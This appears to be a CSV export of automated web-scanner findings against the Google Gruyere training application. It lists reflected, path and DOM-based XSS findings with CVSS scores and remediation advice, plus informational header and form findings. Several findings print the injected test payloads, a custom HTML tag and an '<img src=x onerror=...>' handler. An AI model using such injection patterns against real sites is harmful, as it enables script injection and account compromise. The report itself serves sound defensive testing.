Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"51d5dda7-e8fa-4589-bde3-604eae3ff604",2022-03-15T21:06:17.432Z,2022-03-15T16:06:24Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/%3E%3C' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | /><my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"524c6f89-f579-4815-91af-4762a9a5d725",2022-03-15T21:06:17.432Z,2022-03-15T14:01:05Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"52d1d1e7-2a0b-44bf-98b0-e41b485735f5",2022-03-15T21:06:17.432Z,2022-03-15T14:04:43Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"53d93905-862b-46a5-89e8-939415621b45",2022-03-15T21:06:17.432Z,2022-03-15T17:49:46Z,"A response has been received with a response code '500' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/saveprofile'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"53f45615-4b1f-4e6a-81fc-0367d7d75ef8",2022-03-15T21:06:17.432Z,2022-03-15T15:10:35Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/resetbutton/563265819128830739647592760263700851280 with input fields : 
- g-recaptcha-response (no type specified)

This form is submitted by using the following action : https://google-gruyere.appspot.com/resetbutton/563265819128830739647592760263700851280",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"54d63f07-b8d1-497a-bb5f-d87a687e9894",2022-03-15T21:06:17.432Z,2022-03-15T18:49:20Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/656501648683287335357107855369111942818/feed.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"54f826c5-7360-4a11-a16b-f313a2a1d556",2022-03-15T21:06:17.432Z,2022-03-15T16:23:42Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom html tag.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"5a69cfe6-2d70-4455-9a7e-d1caabbfa24f",2022-03-15T21:06:17.432Z,2022-03-15T14:35:37Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"5bb22588-2558-4cb6-9679-7f360381b798",2022-03-15T21:06:17.432Z,2022-03-15T16:04:07Z,"Vulnerability has been detected on URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/invalid' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"5e315335-2968-425e-b8b4-3ed7e3dbf8f8",2022-03-15T21:06:17.432Z,2022-03-15T14:52:10Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_c1fc528d-1dd4-4d9e-99f9-4e1ad14d9dbd/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Referrer Policy provides mechanisms to websites to restrict referrer information (sent in the referer header) that browsers will be allowed to add.

No Referrer Policy header or metatag configuration has been detected.","HTTP Security Header",98527,"Missing Referrer Policy",,2019-04-02T00:00:00Z,2019-04-02T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",Info,"Configure Referrer Policy on your website by adding 'Referrer-Policy' HTTP header or meta tag referrer in HTML.",,"5fb979fb-6834-4365-80a4-020a76132cd5",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"No Referrer-Policy headers or body meta tags were found on http://google-gruyere.appspot.com/361357029172560933265350706939995878846/",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Permissions Policy provides mechanisms to websites to restrict the use of browser features in its own frame and in iframes that it embeds.","HTTP Security Header",98526,"Missing Permissions Policy",,2019-03-27T00:00:00Z,2021-05-07T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy, https://scotthelme.co.uk/goodbye-feature-policy-and-hello-permissions-policy/",Info,"Configure Permissions Policy on your website by adding 'Permissions-Policy' HTTP header.",,"617efbe8-2db6-42ca-9c98-d0b6e9b71dca",2022-03-15T18:42:41.743Z,2022-03-15T16:44:46Z,"No Permissions-Policy headers were found on http://google-gruyere.appspot.com/361357029172560933265350706939995878846/",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"621c1509-a7d5-44e6-a52f-3a5c1d5eff8f",2022-03-15T18:42:41.743Z,2022-03-15T16:54:41Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/361357029172560933265350706939995878846/saveprofile"">
  <input type=""hidden"" name=""action"" value=""new"">
  </input>
  <input type=""text"" name=""uid"" value="""" maxlength=""16"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""hidden"" name=""is_author"" value=""True"">
  </input>
  <input type=""submit"" value=""Create account"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner collected the cookies returned by the application during the scan. The list includes the following information for each cookie:
 - Name: name of the cookie
 - Value: value of the cookie
 - Domain: hosts to which the cookie will be sent
 - Path: URL path which must exist in the requested resource before sending the cookie
 - Expires: maximum lifetime of the cookie as an HTTP-date timestamp
 - Max-Age: number of seconds until the cookie expires
 - HttpOnly: cookie is set to be not accessible via JavaScript, XMLHttpRequest and Request APIs
 - Secure: cookie will be sent to the server only when a request is made using HTTPS
 - SameSite: cookie will be sent along with cross-site request according the defined policy
 - URL: first URL discovered which set the cookie in its response
 - Set-Method: method used by the application to set the cookie (Set-Cookie or JavaScript)
 - Audited: cookie will be audited by plugins during the scan
 - Reason Not Audited: reason given for the cookie not being audited during the scan","Web Applications",98061,"Cookies Collected",,2020-09-01T00:00:00Z,2021-11-23T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://en.wikipedia.org/wiki/HTTP_cookie, https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies, https://tools.ietf.org/html/rfc6265",Info,,,"62417000-957d-4672-8f38-663e2f27fea4",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"The following cookies have been collected during the scan of the target:
- 1 cookie(s) specified via Set-Cookie
- 1 cookie(s) set via JavaScript code
The complete list of the cookies is available in attachment.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Unlike traditional Cross-Site Scripting (XSS), where the client is able to inject scripts into a request and have the server return the script to the client, DOM XSS does not require that a request be sent to the server and may be abused entirely within the loaded page.

This occurs when elements of the DOM (known as the sources) are able to be manipulated to contain untrusted data, which the client-side scripts (known as the sinks) use or execute an unsafe way.

Scanner has discovered that by inserting an HTML element into the page's DOM inputs (sources), it was possible to then have the HTML element rendered as part of the page by the sink.","Cross Site Scripting",98109,"DOM-based Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/DOM_Based_XSS, https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet",Medium,"Client-side document rewriting, redirection, or other sensitive action, using untrusted data, should be avoided wherever possible, as these may not be inspected by server side filtering.
To remedy DOM XSS vulnerabilities where these sensitive document actions must be used, it is essential to:
1. Ensure any untrusted data is treated as text, as opposed to being interpreted as code or mark-up within the page. 2. Escape untrusted data prior to being used within the page. Escaping methods will vary depending on where the untrusted data is being used. (See references for details.) 3. Use `document.createElement`, `element.setAttribute`, `element.appendChild`, etc. to build dynamic interfaces as opposed to HTML rendering methods such as `document.write`, `document.writeIn`, `element.innerHTML`, or `element.outerHTML `etc.",,"64e6951f-fffc-4558-b4de-42b52ddfdcb1",2022-03-15T21:06:17.432Z,2022-03-15T18:13:15Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/563265819128830739647592760263700851280/feed.gtl' by exploiting 'link' element named 'uid' and injecting following payload:

 | <img src=x onerror=window.top._tenable_wasscan_js_namespace_taint_tracer.log_execution_flow_sink() />",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The design of many web applications require that users be able to upload files that will either be stored or processed by the receiving web server.

Scanner has flagged this not as a vulnerability, but as a prompt for the penetration tester to conduct further manual testing on the file upload function.

An insecure form-based file upload could allow a cyber-criminal a means to abuse and successfully exploit the server directly, and/or any third party that may later access the file. This can occur through uploading a file containing server side-code (such as PHP) that is then executed when requested by the client.","Web Applications",98080,"Form-based File Upload",,2017-03-31T00:00:00Z,2017-10-16T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://www.owasp.org/index.php/Unrestricted_File_Upload",Info,"The identified page should at a minimum:
1. Whitelist permitted file types and block all others. This should be conducted on the MIME type of the file rather than its extension. 2. As the file is uploaded, and prior to being handled (written to the disk) by the server, the filename should be stripped of all control, special, or Unicode characters. 3. Ensure that the upload is conducted via the HTTP `POST` method rather than `GET` or `PUT`. 4. Ensure that the file is written to a directory that does not hold any execute permission and that all files within that directory inherit the same permissions. 5. Scan (if possible) with an up-to-date virus scanner before being stored. 6. Ensure that the application handles files as per the host operating system. For example, the length of the file name is appropriate, there is adequate space to store the file, protection against overwriting other files etc.",,"64f66f6b-4cd0-41d6-93f5-cd77f0bcd6a8",2022-03-15T21:06:17.432Z,2022-03-15T19:23:39Z,"The scanner detected the presence of a file upload functionnality in a form returned by the target application.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"655cfc00-1e80-4ea1-89a3-fadb0f4d0277",2022-03-15T21:06:17.432Z,2022-03-15T16:14:44Z,"A response has been received with a response code '400' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP GET request made on the URL 'https://google-gruyere.appspot.com/563265819128830739647592760263700851280/snippets.gtl'.",NONE,Info,ACTIVE
